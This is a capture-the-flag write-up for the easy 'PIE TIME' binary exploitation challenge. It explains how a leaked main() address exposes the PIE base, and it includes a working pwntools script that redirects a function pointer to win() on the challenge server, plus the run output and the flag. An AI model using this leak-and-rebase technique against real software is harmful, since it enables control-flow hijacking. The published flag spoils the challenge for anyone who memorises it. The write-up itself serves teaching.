# PIE TIME

## Challenge Information

- **Category:** Binary Exploitation
- **Difficulty:** Easy
- **Target:** `chatelaine.cylabacademy.net:15385`
- **Binary:** `vuln`
- **Source:** `vuln.c`

## Objective

Exploit the vulnerable program to execute the hidden `win()` function and retrieve the flag.

## 1. Challenge Overview

The program prints the runtime address of `main()`, accepts a hexadecimal address from the user, and calls that address through a function pointer.

Relevant source code:

```c
printf("Address of main: %p\n", &main);

unsigned long val;
printf("Enter the address to jump to, ex => 0x12345: ");
scanf("%lx", &val);

void (*foo)(void) = (void (*)())val;
foo();
```

The `win()` function opens `flag.txt` and prints its contents.

The challenge has Position-Independent Executable (PIE) enabled, meaning the executable's base address can change between executions. However, the relative offsets of functions within the binary remain constant.

## 2. Inspect the Binary

Download `vuln` and `vuln.c` from the challenge page.

Check the binary type:

```bash
file vuln
```

Check its security protections:

```bash
checksec --file=./vuln
```

The binary uses PIE, NX, stack canaries, and Full RELRO. For this challenge, the important protection is PIE because function addresses change with the executable's load base.

## 3. Find Function Offsets

Use `nm` to locate `main()` and `win()`:

```bash
nm -n ./vuln | grep -E ' main$| win$'
```

The relevant offsets in this binary are:

```text
main: 0x134c
win:  0x12aa
```

These are ELF-relative function offsets, not the randomized runtime addresses.

## 4. Understand the PIE Address Calculation

The program leaks the runtime address of `main()`. We can use this information to calculate the executable's PIE base.

**Formula:**

```text
PIE base = Leaked main address - main offset
```

Once the base is known, calculate the runtime address of `win()`:

```text
Runtime win address = PIE base + win offset
```

For example, the remote program returned:

```text
Address of main: 0x5f74c621c34c
```

Calculate the PIE base:

```text
0x5f74c621c34c - 0x134c = 0x5f74c621b000
```

Calculate the runtime address of `win()`:

```text
0x5f74c621b000 + 0x12aa = 0x5f74c621c2aa
```

This gives the correct runtime address to pass to the vulnerable program.

## 5. Automate the Exploit with Pwntools

Install Pwntools if necessary:

```bash
python3 -m pip install pwntools
```

Create `solve.py`:

```python
from pwn import *

context.log_level = "info"

HOST = "chatelaine.cylabacademy.net"
PORT = 15385

elf = ELF("./vuln", checksec=False)
io = remote(HOST, PORT)

# Read the leaked runtime address of main()
io.recvuntil(b"Address of main: ")
main_leak = int(io.recvline().strip(), 16)

log.success(f"Leaked main address: {hex(main_leak)}")

# Calculate the PIE base
pie_base = main_leak - elf.sym.main
log.success(f"PIE base: {hex(pie_base)}")

# Rebase the ELF to calculate runtime function addresses
elf.address = pie_base
win_addr = elf.sym.win

log.success(f"Runtime win address: {hex(win_addr)}")

# Send the address of win()
io.sendlineafter(
    b"Enter the address to jump to, ex => 0x12345: ",
    hex(win_addr).encode()
)

# Display the result
io.interactive()
```

Run the exploit:

```bash
python3 solve.py
```

## 6. Exploitation Results

The successful execution produced:

```text
[+] Opening connection to chatelaine.cylabacademy.net on port 15385: Done
[+] Leaked main address: 0x5f74c621c34c
[+] PIE base: 0x5f74c621b000
[+] Runtime win address: 0x5f74c621c2aa
[*] Switching to interactive mode
Your input: 5f74c621c2aa
You won!
academy{b4s1c_p051t10n_1nd3p3nd3nc3_7944b1a7}
```

## 7. Flag

```text
academy{b4s1c_p051t10n_1nd3p3nd3nc3_7944b1a7}
```

## 8. Key Learnings

- **PIE:** Allows an executable to be loaded at different base addresses.
- **ASLR:** Randomizes memory locations, making hardcoded runtime addresses unreliable.
- **Information leaks:** A leaked function address can reveal the executable's load base.
- **Address rebasing:** Subtracting a known function offset from its leaked address reveals the PIE base.
- **Function-pointer hijacking:** The program uses attacker-controlled input as a function address.
- **Pwntools:** Automates interaction with the remote service and calculates runtime addresses.

## Conclusion

The challenge was solved by exploiting the program's unsafe function-pointer call. The leaked address of `main()` allowed the PIE base to be calculated, and the known offset of `win()` was used to determine its runtime address. Supplying that address caused the program to execute `win()` and print the flag.

**Core takeaway:** PIE randomizes the executable's base address, but a runtime address leak can make it possible to calculate the addresses of other functions in the same binary.